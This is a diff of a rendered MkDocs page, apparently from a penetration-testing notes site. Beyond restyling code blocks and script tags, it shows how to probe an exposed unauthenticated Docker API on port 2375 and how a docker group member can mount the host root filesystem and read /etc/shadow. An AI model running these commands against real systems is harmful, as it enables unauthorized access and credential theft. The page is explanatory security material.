@@ -19,9 +19,7 @@
     var mkdocs_page_input_path = "docker.md";
     var mkdocs_page_url = "/docker/";
   </script>
-  
-  <script src="../js/jquery-2.1.1.min.js" defer></script>
-  <script src="../js/modernizr-2.8.3.min.js" defer></script> 
+   
 </head>
 
 <body class="ready sticky">
@@ -304,12 +302,13 @@
 <h2 id="api">API</h2>
 <p>The docker API expose the port <code>2375</code>. This API can be used to interact with the docker engine which basically give ou the right to do anything you desire unauthenticated.</p>
 <p>To confirm that the host is running Docker you can make a GET requests to <code>/version</code> :</p>
-<pre><code class="language-none line-numbers">http://&lt;host&gt;:&lt;port&gt;/version
+<pre><code class="language-http">http://&lt;host&gt;:&lt;port&gt;/version
+
 {&quot;Platform&quot;: {&quot;Name&quot;: &quot;&quot;}, &quot;Components&quot;: [{&quot;Name&quot;: &quot;Engine&quot;, &quot;Version&quot;: &quot;18.06.1-ce&quot;, &quot;Details&quot;: {&quot;ApiVersion&quot;: &quot;1.38&quot;, &quot;Arch&quot;: &quot;amd64&quot;, &quot;BuildTime&quot;: &quot;2018-10-26T23:39:57.000000000+00:00&quot;, &quot;Experimental&quot;: &quot;false&quot;, &quot;GitCommit&quot;: &quot;e68fc7a/18.06.1-ce&quot;, &quot;GoVersion&quot;: &quot;go1.10.3&quot;, &quot;KernelVersion&quot;: &quot;4.14.47-64.38.amzn2.x86_64&quot;, &quot;MinAPIVersion&quot;: &quot;1.12&quot;, &quot;Os&quot;: &quot;linux&quot;}}], &quot;Version&quot;: &quot;18.06.1-ce&quot;, &quot;ApiVersion&quot;: &quot;1.38&quot;, &quot;MinAPIVersion&quot;: &quot;1.12&quot;, &quot;GitCommit&quot;: &quot;e68fc7a/18.06.1-ce&quot;, &quot;GoVersion&quot;: &quot;go1.10.3&quot;, &quot;Os&quot;: &quot;linux&quot;, &quot;Arch&quot;: &quot;amd64&quot;, &quot;KernelVersion&quot;: &quot;4.14.47-64.38.amzn2.x86_64&quot;, &quot;BuildTime&quot;: &quot;2018-10-26T23:39:57.000000000+00:00&quot;}
 </code></pre>
 
 <p>Then, using the CLI you can execute commands, for instance:</p>
-<pre><code class="language-bash line-numbers">$ docker -H &lt;host&gt;:&lt;port&gt; ps
+<pre><code class="language-bash">$ docker -H &lt;host&gt;:&lt;port&gt; ps
 
 CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
 be2dd8aa8222        ubuntu:14.04        &quot;bash&quot;              5 years ago         Up 2 seconds                            silly_elion
@@ -322,11 +321,11 @@ root
 <h2 id="privilege-escalation">Privilege Escalation</h2>
 <p>If the current user belong to the <code>docker</code> group then he can start a container
 with a binding to files own by root and read them:</p>
-<pre><code class="language-bash line-numbers">docker run --it --rm -v /:/mnt alpine:latest /mnt sh
+<pre><code class="language-bash">docker run --it --rm -v /:/mnt alpine:latest /mnt sh
 </code></pre>
 
 <p>Inside the container shell he can read all the files as root:</p>
-<pre><code class="language-bash line-numbers">cat /etc/shadow
+<pre><code class="language-bash">cat /etc/shadow
 </code></pre>
             
           </div>
@@ -354,18 +353,8 @@ with a binding to files own by root and read them:</p>
     </span>
 </div>
     <script>var base_url = '..';</script>
-    <script src="../js/theme.js"></script>
-    <script src="../js/prism-core.min.js"></script>
-    <script src="../js/prism-line-numbers.min.js"></script>
-    <script src="../js/prism-clike.min.js"></script>
-    <script src="../js/prism-yaml.min.js"></script>
-    <script src="../js/prism-powershell.min.js"></script>
-    <script src="../js/prism-bash.min.js"></script>
-    <script src="../js/prism-nginx.min.js"></script>
-    <script src="../js/prism-python.min.js"></script>
-    <script src="../js/prism-markup.min.js"></script>
-    <script src="../js/prism-markup-templating.min.js"></script>
-    <script src="../js/prism-php.min.js"></script>
+    <script async src="../js/theme.js"></script>
+    <script async src="../js/prism.min.js"></script>
     <script src="../search/main.js"></script>
     
     <script>
